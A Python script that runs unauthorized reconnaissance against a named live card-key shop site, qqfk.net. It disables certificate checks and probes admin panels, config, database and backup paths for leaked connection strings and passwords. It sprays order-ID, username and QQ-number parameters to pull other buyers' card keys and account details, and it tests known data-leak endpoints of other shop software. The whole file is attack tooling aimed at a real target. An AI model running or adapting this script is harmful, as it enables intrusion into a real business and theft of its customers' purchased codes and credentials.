#!/usr/bin/env python3
"""ASP shop recon on www.qqfk.net / qqfk.net — SUCCESS_CASES N/A but probe common leaks."""
import re
import json
import ssl
import urllib.parse
import urllib.request
import urllib.error
import http.cookiejar
from pathlib import Path

OUT = Path("/data/recon/qqfk.net")
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
CTX = ssl.create_default_context()
CTX.check_hostname = False
CTX.verify_mode = ssl.CERT_NONE


def make_op():
    return urllib.request.build_opener(
        urllib.request.HTTPCookieProcessor(http.cookiejar.CookieJar()),
        urllib.request.HTTPSHandler(context=CTX),
    )


def fetch(op, url, data=None, headers=None):
    h = {"User-Agent": UA, "Accept": "*/*", "Referer": "https://www.qqfk.net/"}
    if headers:
        h.update(headers)
    req = urllib.request.Request(url, data=data, headers=h)
    try:
        r = op.open(req, timeout=20)
        body = r.read()
        return r.geturl(), getattr(r, "status", 200), body
    except urllib.error.HTTPError as e:
        return url, e.code, e.read()
    except Exception as e:
        return url, None, str(e).encode()


def main():
    op = make_op()
    results = {"hosts": [], "paths": {}, "buy": {}, "query_like": {}, "success_cases": "N/A_not_ykfaka_or_rainbow"}

    hosts = ["https://www.qqfk.net", "https://qqfk.net", "http://www.qqfk.net", "http://qqfk.net"]
    paths = [
        "/", "/Index.asp", "/index.asp", "/login.asp", "/reg.asp", "/member.asp",
        "/buy.asp", "/buy.asp?id=171", "/buy.asp?id=1", "/chongzhi.asp",
        "/kucun.asp", "/upgr.asp", "/channel.asp?id=2", "/chkuser.asp",
        "/WebLogin.asp", "/WapLogin.asp", "/manage/", "/manage/login.asp",
        "/manage/index.asp", "/admin/", "/admin/login.asp",
        "/order.asp", "/orders.asp", "/query.asp", "/chaxun.asp", "/search.asp",
        "/kami.asp", "/card.asp", "/faka.asp", "/show.asp", "/look.asp",
        "/user.asp", "/userinfo.asp", "/pay.asp", "/payok.asp",
        "/api.asp", "/ajax.asp", "/json.asp",
        "/inc/", "/inc/conn.asp", "/inc/config.asp", "/inc/checkcode.asp",
        "/database/", "/data/", "/db/", "/backup/",
        "/Query.html", "/ajax.php", "/api.php", "/?mod=query",
    ]

    for host in hosts:
        for path in paths:
            url = host + path
            final, code, body = fetch(op, url)
            text = body.decode("utf-8", "ignore") if isinstance(body, (bytes, bytearray)) else str(body)
            # try gbk
            if isinstance(body, (bytes, bytearray)) and ("�" in text or title_mojibake(text)):
                try:
                    text = body.decode("gbk", "ignore")
                except Exception:
                    pass
            title = (re.search(r"<title>([^<]+)", text, re.I) or [None, None])[1]
            markers = {
                "kami": "卡密" in text or "kami" in text.lower(),
                "password": "密码" in text and ("账号" in text or "帐号" in text),
                "login": "登录" in text or "login" in text.lower(),
                "error_asp": "Microsoft OLE DB" in text or "SQL" in text[:500],
                "conn_str": "Provider=" in text or "Password=" in text[:2000],
            }
            row = {
                "final": final, "code": code, "len": len(body) if body else 0,
                "title": title, "markers": markers,
                "snip": re.sub(r"\s+", " ", text[:160]),
            }
            results["paths"][url] = row
            interesting = (
                code not in (404, None)
                and path not in ("/",)
                and (
                    any(markers.values())
                    or (isinstance(code, int) and code < 400 and row["len"] not in (0,))
                    or (isinstance(code, int) and code in (200, 302, 500) and "Not Found" not in (title or ""))
                )
            )
            # always print key ones
            if interesting or path in (
                "/buy.asp?id=171", "/manage/", "/manage/login.asp", "/kucun.asp",
                "/chaxun.asp", "/query.asp", "/order.asp", "/inc/config.asp",
                "/Query.html", "/ajax.php", "/api.php",
            ):
                print(code, url, row["len"], title, markers)

    # buy page deep
    for host in ["https://www.qqfk.net", "https://qqfk.net"]:
        for bid in [171, 209, 1, 2, 100]:
            url = f"{host}/buy.asp?id={bid}"
            final, code, body = fetch(op, url)
            text = decode_best(body)
            (OUT / "probe" / f"buy_{host.split('//')[1].replace('.','_')}_{bid}.html").write_text(text, encoding="utf-8")
            forms = re.findall(r"<form[\s\S]*?</form>", text, re.I)
            inputs = re.findall(r'name=["\']([^"\']+)["\']', text, re.I)
            print("BUY", url, code, len(body or b""), "forms", len(forms), "inputs", inputs[:30])
            results["buy"][url] = {
                "code": code, "len": len(body or b""),
                "inputs": inputs[:40],
                "has_kami_ui": "卡密" in text,
                "price": re.findall(r"([\d]+\.[\d]{2})", text)[:8],
            }

    # order/query param sprays on likely endpoints that returned 200
    query_endpoints = []
    for url, row in results["paths"].items():
        if row.get("code") == 200 and any(
            x in url.lower() for x in ["chaxun", "query", "order", "search", "look", "show", "kami", "card"]
        ):
            query_endpoints.append(url)
    # also try common query param names on member/buy-related
    for host in ["https://www.qqfk.net"]:
        for path in ["/chaxun.asp", "/query.asp", "/order.asp", "/search.asp", "/look.asp", "/member.asp"]:
            for params in [
                {"id": "1"}, {"orderid": "1"}, {"ddh": "1"}, {"no": "1"},
                {"username": "admin"}, {"qq": "123456"}, {"key": "1"},
            ]:
                url = host + path + "?" + urllib.parse.urlencode(params)
                final, code, body = fetch(op, url)
                text = decode_best(body)
                if code == 200 and "Not Found" not in (text[:200]):
                    hit = any(k in text for k in ["卡密", "订单", "账号", "密码", "发货"])
                    print("QPARAM", code, url, len(body or b""), "hit" if hit else "", re.sub(r"\s+", " ", text[:120]))
                    results["query_like"][url] = {
                        "code": code, "len": len(body or b""), "hit": hit,
                        "snip": re.sub(r"\s+", " ", text[:200]),
                    }

    # SUCCESS_CASES explicit negatives
    sc = {}
    for host in ["https://qqfk.net", "https://www.qqfk.net"]:
        for path, label in [
            ("/Query.html", "ykfaka_query"),
            ("/ajax.php?act=query&page=1", "rainbow_ajax_query"),
            ("/api.php?act=search&id=1", "api_search"),
            ("/api.php?act=tools&key=123456&limit=1", "tools"),
            ("/?mod=query&data=1", "qd93"),
            ("/index.php?m=Home&c=Order&a=query&value=null", "ykfaka_null"),
        ]:
            final, code, body = fetch(op, host + path)
            text = decode_best(body)
            sc[host + path] = {
                "label": label, "code": code, "len": len(body or b""),
                "title": (re.search(r"<title>([^<]+)", text) or [None, None])[1],
                "snip": re.sub(r"\s+", " ", text[:160]),
            }
            print("SC", label, host + path, code, sc[host + path]["title"])
    results["success_cases_detail"] = sc
    results["kami_found"] = False

    (OUT / "dump" / "ASP_RECON.json").write_text(
        json.dumps(results, ensure_ascii=False, indent=2), encoding="utf-8"
    )
    print("DONE")


def title_mojibake(text):
    return "å" in text or "æ" in text[:200]


def decode_best(body):
    if not isinstance(body, (bytes, bytearray)):
        return str(body)
    for enc in ("utf-8", "gbk", "gb2312"):
        try:
            t = body.decode(enc)
            if "Ã" not in t[:200] and "å" not in t[:80]:
                return t
            if enc == "gbk":
                return t
        except Exception:
            pass
    return body.decode("utf-8", "ignore")


if __name__ == "__main__":
    main()
